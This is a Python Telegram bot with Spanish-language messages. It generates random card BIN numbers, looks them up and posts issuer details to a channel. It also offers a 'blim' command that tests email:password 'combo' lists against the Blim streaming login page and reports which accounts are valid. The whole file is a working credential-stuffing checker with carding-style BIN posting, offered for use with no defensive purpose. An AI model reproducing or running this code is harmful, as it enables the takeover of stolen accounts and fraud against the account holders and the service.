import telegram
import logging
from telegram import Update
from telegram.utils.helpers import escape_markdown
from telegram.ext import Updater, CommandHandler, Filters 
from random import *
from io import *
from time   import sleep
import requests,json,re,os,sys
from random import randint
users = ["flyead_boy"]
logging.basicConfig(
	level = logging.INFO,format="%(asctime)s - %(name)s -%(levelname)s - %(message)s")
logger = logging.getLogger()
TOKEN = os.getenv("TOKEN")
mode = os.getenv("MODE")
if mode == "dev":
	def run(updater):
		updater.start_polling()
		updater.idle()
elif mode == "prod":
	def run(updater):
		PORT = int(os.environ.get("PORT","8443"))
		HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME")
		updater.start_polling()
		updater.idle()
else:
	logger.info("No se especifico el modo")
	sys.exit()
def InitBi():
	#generar 6 numeros random

	a = randint(0,50)
	b = randint(0,50)
	c = randint(0,50)
	d = randint(0,50)
	f = randint(0,50)
	g = randint(0,50)

	bin=str(int(a))+str(int(b))+str(int(c))+str(int(d))+str(int(d))+str(int(f))+str(int(g))

	# proceso de verificacion 

	if len(bin) >= 6:
		bin = str(bin)
	try:
		bin = bin.replace("x","")
		bin = bin.replace("X","")
		bin = bin.split("|")[0]
	except:
		pass
	bin = str(re.sub('([a-zA-Z]){1,}',"",bin))

	lenLuhn = len(str(bin))
	sinccheck = bin[:16]
	bin = str(bin)
	bin = re.sub('([a-zA-Z]){1,}', '', bin)
	try:
		api = 'https://lookup.binlist.net/'+str(bin) # api más dato del bin para sacar datos
		try:
			page =  requests.get(api)
			page.raise_for_status()
		except:
			pass
		page = page.content.decode()
		dic = json.loads(page)
		try:
			marca = dic['scheme']
			try:
				tipo = dic['type']
				try:
					brnd = dic['brand']
					try:
						el_alpha = dic['country']['alpha2']
						try:
							pais = dic['country']['name']
							try:
								emote = dic['country']['emoji']
								try:
									tipo_moneda = dic['country']['currency']
									try:
										bank_name = dic['bank']['name']
										try:
											bank_url = dic['bank']['url']
											msg="""
----------------------------------------------------

ಠ-> Bin : <code>{}</code> {}

ಠ-> Marca : <b>{}</b>

ಠ-> Tipo de tarjeta: <b>{}</b>

ಠ-> Nivel de tarjeta: <b>{}</b>

ಠ-> Banco : <b>{}</b>

ಠ-> País : <b>{} - {} - 💲 {}</b>

ಠ-> URL Banco : <b>{}</b>

---------------------------------------------------""".format(bin,emote,marca,tipo,brnd,bank_name,pais,el_alpha,tipo_moneda,bank_url)
										except:
											msg = "SIGNAL ERROR"
									except:
										msg = "SIGNAL ERROR"
								except:
									msg = "SIGNAL ERROR"
							except:
								msg = "SIGNAL ERROR"
						except:
							msg = "SIGNAL ERROR"
					except:
						msg = "SIGNAL ERROR"
				except:
					msg = "SIGNAL ERROR"
			except:
				msg = "SIGNAL ERROR"
		except:
			msg = "SIGNAL ERROR"
	except:
		msg = "SIGNAL ERROR"
	return msg # devuelve mensaje resuelto

def cbinl():

	bin = InitBi()

	if bin != "SIGNAL ERROR":
		return bin
	while bin == "SIGNAL ERROR": #BUCLE PARA QUE NO APAREZCA EL ERROR DE CREACION Y LA CREACION SEA UNICA 
		bin = InitBi()
		if bin == "SIGNAL ERROR":
			pass
		else:
			return bin
			break
def Chblim(correo,password):
    req = requests.session()
    correo = correo
    password = password
    param = {
        "username":"{}".format(correo),
        "password":"{}".format(password),
        "mso":1,
        "remember":0}
    source = req.post('https://www.blim.com/cuenta/ingresar',
        data=param)
    if 'incorrectos' in source.text or "The input is not a valid email address." in source.text or 'no es un correo' in source.text or "Request Bloqued" in source.text:
        return '''
ಠ-> RESULTADO : <b>CUENTA INCORRECTA</b>

ಠ-> CORREO : <code>{}</code>

ಠ-> PASSWORD : <code>{}</code>

ಠ-> [ RESPONSE ]

<code>{}</code>'''.format(correo,password,source.text)
    else:
        return '''
ಠ-> RESULTADO : <b>CUENTA CORRECTA</b>

ಠ-> CORREO : <code>{}</code>

ಠ-> PASSWORD : <code>{}</code>

ಠ-> [ RESPONSE ]

<code>{}</code>'''.format(correo,password,source.text)
my_bot=telegram.Bot(token=TOKEN)
updater = Updater(token=my_bot.token,use_context=True)
dispatcher = updater.dispatcher
def start(update,context):
	user = update.message.from_user.username
	logger.info(f"el usuario {update.effective_user['username']},uso el comando start")
	if user in users:
		msg="""
<i>BIENVENIDO AMO {}</i>

ಠ-> /sodnfoi : <i>para empezar a enviar bins al canal</i>

ಠ-> /blim : <i>checker de cuentas de blim (correo pass)</i>
""".format(user)
	else:
		msg = "ಠ-> ERROR : <b>NO TIENES ACCESO A ESTE BOT</b>"
	update.message.reply_text(msg,parse_mode="HTML")
def sodnfoi(update,context):
	user = update.message.from_user.username
	if user == "flyead_boy":
		for i in range(0,10):
			bin = cbinl()
			bot=context.bot
			bot.sendMessage(
				chat_id="@newbinsby",
				text = bin,
				parse_mode="HTML")
			msg = "enviado correctamente [ uwu ]"
	else:
		msg = "ಠ-> ERROR : <b>NO TIENES LOS PERMISOS NECESARIOS PARA USAR ESTE COMANDO</b>"
	update.message.reply_text(msg,parse_mode="HTML")
def blim(update,context):
	logger.info(f"el usuario {update.effective_user['username']},uso el comando blim")
	args = context.args
	user = update.message.from_user.username
	if user in users:
		if len(args) == 2:
			if ":" in args[0] and ":" in args[1]:
				accs=args[0].split(":")
				accs_2= args[1].split(":")
				if len(accs) == 2 and len(accs_2) == 2:
					if accs[1]!="" and accs[0]!="" and accs_2[0]!="" and accs_2[1]!="":
						msg_1 = Chblim(accs[0],accs[1])
						msg_2 = Chblim(accs_2[0],accs_2[1])
						msg = """
						{}

						{}""".format(msg_1,msg_2)
			else:
				msg = Chblim(args[0],args[1])
		elif len(args) == 1:
			accs = args[0].split(":")
			if len(accs)==2:
				if accs[1]!="" and accs[0]!="":
					msg = Chblim(accs[0],accs[1])
				else:
					msg = "ಠ-> ERROR : <b>FORMATO DE COMBO NO VALIDO</b>"
			else:
				msg = "ಠ-> ERROR : <b>FORMATO DE COMBO NO VALIDO</b>"
		else:
			msg="ಠ-> ERROR : <b>NO AGREGO LOS DATOS DE LA CUENTA</b>"
	else:
		msg="ಠ-> ERROR : <b>usted no tiene acceso al bot</b>"
	update.message.reply_text(msg,parse_mode="HTML")
def add(update,context):
	logger.info(f"el usuario {update.effective_user['username']} agrego añadio un nuevo usuario")
	args = context.args
	user = update.message.from_user.username
	if user == "flyead_boy":
		if len(args) > 0:
			for i in args:
				users.append(i)
			msg = f"""
ಠ-> RESPUESTA : <b>añadio nuevos usuarios</b>

ಠ [ USUARIOS ]

{args}"""
		else:
			msg = "ಠ-> ERROR : NO INGRESO LOS USERNAMES ( SIN @ )"
	else:
		msg="ಠ-> ERROR : <b>usted no tiene acceso al comando"
	update.message.reply_text(msg,parse_mode="HTML")
dispatcher.add_handler(CommandHandler("add",add))
dispatcher.add_handler(CommandHandler("blim",blim))
dispatcher.add_handler(CommandHandler("sodnfoi",sodnfoi))
dispatcher.add_handler(CommandHandler("start",start))
run(updater)
